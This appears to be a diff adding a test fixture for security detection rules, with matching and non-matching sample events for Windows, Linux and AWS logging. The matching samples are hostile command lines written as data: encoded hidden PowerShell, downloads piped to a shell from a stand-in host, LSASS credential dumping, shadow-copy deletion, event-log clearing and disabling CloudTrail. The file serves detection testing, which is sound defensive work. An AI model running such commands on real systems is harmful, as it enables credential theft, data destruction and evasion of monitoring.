@@ -1,0 +1,93 @@
+{
+"win_susp_powershell_encoded_command": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQA="},
+    {"Image":"C:\\Program Files\\PowerShell\\7\\pwsh.exe","CommandLine":"pwsh -ec SQBFAFgA"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -File C:\\scripts\\backup.ps1"},
+    {"Image":"C:\\Windows\\System32\\notepad.exe","CommandLine":"notepad.exe -enc"}
+  ]},
+"win_susp_office_child_process": {
+  "match": [
+    {"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami"},
+    {"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta http://example.test/a.hta"}
+  ],
+  "nomatch": [
+    {"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe"},
+    {"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Image":"C:\\Windows\\System32\\splwow64.exe","CommandLine":"splwow64.exe"}
+  ]},
+"win_susp_certutil_download": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://example.test/p.exe p.exe"},
+    {"Image":"C:\\Users\\x\\Downloads\\renamed.exe","OriginalFileName":"CertUtil.exe","CommandLine":"renamed.exe -verifyctl -f -split https://example.test/p.bin"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -hashfile C:\\file.iso SHA256"},
+    {"Image":"C:\\Windows\\System32\\curl.exe","CommandLine":"curl.exe -urlcache http://example.test"}
+  ]},
+"win_susp_shadow_copy_deletion": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin.exe delete shadows /all /quiet"},
+    {"Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","CommandLine":"wmic shadowcopy delete"},
+    {"Image":"C:\\Windows\\System32\\bcdedit.exe","CommandLine":"bcdedit /set {default} recoveryenabled no"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin list shadows"},
+    {"Image":"C:\\Windows\\System32\\bcdedit.exe","CommandLine":"bcdedit /enum"}
+  ]},
+"win_susp_lsass_dump_commandline": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"},
+    {"Image":"C:\\Tools\\procdump64.exe","CommandLine":"procdump64.exe -ma lsass.exe l.dmp"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Tools\\procdump64.exe","CommandLine":"procdump64.exe -ma myapp.exe a.dmp"},
+    {"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe shell32.dll,Control_RunDLL"}
+  ]},
+"win_susp_schtasks_suspicious_create": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Upd /tr C:\\Users\\Public\\a.exe /sc minute"},
+    {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn X /tr \"powershell -w hidden -c calc\" /sc onlogon"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /query /fo LIST"},
+    {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Backup /tr D:\\backup\\run.bat /sc daily"}
+  ]},
+"win_susp_local_admin_group_add": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\net1.exe","CommandLine":"net1 localgroup administrators evil /add"},
+    {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell Add-LocalGroupMember -Group Administrators -Member evil"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net localgroup administrators"},
+    {"Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net localgroup users bob /add"}
+  ]},
+"win_susp_eventlog_cleared": {
+  "match": [
+    {"Image":"C:\\Windows\\System32\\wevtutil.exe","CommandLine":"wevtutil.exe cl Security"},
+    {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell Clear-EventLog -LogName Application"}
+  ],
+  "nomatch": [
+    {"Image":"C:\\Windows\\System32\\wevtutil.exe","CommandLine":"wevtutil.exe qe Security /c:5"},
+    {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell Get-EventLog -LogName Security"}
+  ]},
+"lnx_susp_curl_wget_pipe_to_shell": {
+  "match": [
+    {"Image":"/bin/bash","CommandLine":"bash -c 'curl -fsSL http://example.test/i.sh | sh'"},
+    {"Image":"/usr/bin/dash","CommandLine":"sh -c \"wget -qO- http://example.test/x |bash\""}
+  ],
+  "nomatch": [
+    {"Image":"/bin/bash","CommandLine":"bash -c 'curl -o /tmp/i.sh http://example.test/i.sh'"},
+    {"Image":"/usr/bin/curl","CommandLine":"curl http://example.test/i.sh | sh"}
+  ]},
+"aws_cloudtrail_logging_disabled": {
+  "match": [
+    {"eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging"},
+    {"eventSource":"cloudtrail.amazonaws.com","eventName":"DeleteTrail"}
+  ],
+  "nomatch": [
+    {"eventSource":"cloudtrail.amazonaws.com","eventName":"DescribeTrails"},
+    {"eventSource":"s3.amazonaws.com","eventName":"DeleteTrail"}
+  ]}
+}
